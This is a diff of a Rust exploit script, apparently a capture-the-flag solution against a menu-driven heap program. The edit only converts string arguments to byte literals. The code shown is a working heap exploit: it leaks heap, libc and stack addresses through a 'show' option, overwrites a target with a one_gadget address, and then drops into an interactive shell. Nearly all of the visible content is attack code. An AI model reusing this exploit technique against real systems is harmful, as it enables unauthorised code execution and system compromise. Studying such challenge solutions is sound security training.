@@ -16,50 +16,50 @@ type Result<T> = std::result::Result<T, Box<dyn Error>>;
 
 async fn selkey(key: bool) -> Result<()> {
    if !key {
-       sendlineafter!(">".into(), "2".into())?;
+       sendlineafter!(b">", b"2")?;
    } else {
-       sendlineafter!(">".into(), "1".into())?;
+       sendlineafter!(b">", b"1")?;
    }
    Ok(())
 }
 
 async fn alloc(size: usize, key: bool) -> Result<()> {
     selkey(key).await?;
-    sendline!("1".into())?;
-    sendline!(format!("{}", size).into())?;
+    sendline!(b"1")?;
+    sendline!(&format!("{}", size).into_bytes())?;
     Ok(())
 }
 
 async fn delete(idx: usize, key: bool) -> Result<()> {
     selkey(key).await?;
-    sendline!("2".into())?;
-    sendline!(format!("{}", idx).into())?;
+    sendline!(b"2")?;
+    sendline!(&format!("{}", idx).into_bytes())?;
     Ok(())
 }
 
 async fn modify(idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
     selkey(false).await?;
-    sendline!("3".into())?;
-    sendline!(format!("{}", idx).into())?;
-    sendline!(format!("{}", keyno).into())?;
-    sendline!(format!("{}", size).into())?;
-    send!(cont)?;
+    sendline!(b"3")?;
+    sendline!(&format!("{}", idx).into_bytes())?;
+    sendline!(&format!("{}", keyno).into_bytes())?;
+    sendline!(&format!("{}", size).into_bytes())?;
+    send!(&cont)?;
     Ok(())
 }
 
 async fn kmodify(idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
     selkey(true).await?;
-    sendline!("3".into())?;
-    sendline!(format!("{}", idx).into())?;
-    sendline!(format!("{}", size).into())?;
-    sendline!(cont)?;
+    sendline!(b"3")?;
+    sendline!(&format!("{}", idx).into_bytes())?;
+    sendline!(&format!("{}", size).into_bytes())?;
+    sendline!(&cont)?;
     Ok(())
 }
 
 async fn show(idx: usize, key: bool) -> Result<()> {
     selkey(key).await?;
-    sendline!("4".into())?;
-    sendline!(format!("{}", idx).into())?;
+    sendline!(b"4")?;
+    sendline!(&format!("{}", idx).into_bytes())?;
     Ok(())
 }
 
@@ -84,7 +84,7 @@ async fn main() -> Result<()> {
 
         show(1, false).await?;
 
-        recvuntil!("Here is your content:".into())?;
+        recvuntil!(b"Here is your content:")?;
         recvline!()?;
 
         let mut heap_leak = recv!(6)?;
@@ -103,7 +103,7 @@ async fn main() -> Result<()> {
 
         show(2, false).await?;
 
-        recvuntil!("Here is your content:".into())?;
+        recvuntil!(b"Here is your content:")?;
         recvline!()?;
 
         let mut libc_leak = recv!(6)?;
@@ -124,7 +124,7 @@ async fn main() -> Result<()> {
 
         show(5, false).await?;
 
-        recvuntil!("Here is your content:".into())?;
+        recvuntil!(b"Here is your content:")?;
         recvline!()?;
 
         let mut stack_leak = recv!(6)?;
@@ -161,7 +161,7 @@ async fn main() -> Result<()> {
     kmodify(2, 31, one_gadget).await?;
 
     // exit and get shell!
-    p!().sendline("3".into()).await?;
+    p!().sendline(b"3").await?;
     p!().interactive().await?;
     Ok(())
 }
